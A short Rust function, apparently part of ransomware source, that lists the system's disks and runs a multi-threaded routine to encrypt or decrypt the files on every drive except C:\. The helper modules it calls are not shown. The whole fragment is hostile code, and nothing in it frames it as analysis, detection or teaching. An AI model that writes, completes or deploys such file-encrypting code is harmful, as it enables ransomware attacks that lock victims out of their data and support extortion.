pub fn encrypt_decrypt_external_disks() {
    let disks = crate::system::info::get_disks();

    for disk in disks {
        if disk != "C:\\" {
            super::file::multi_threaded_encrypt_decrypt_files(&disk);
        }
    }
}
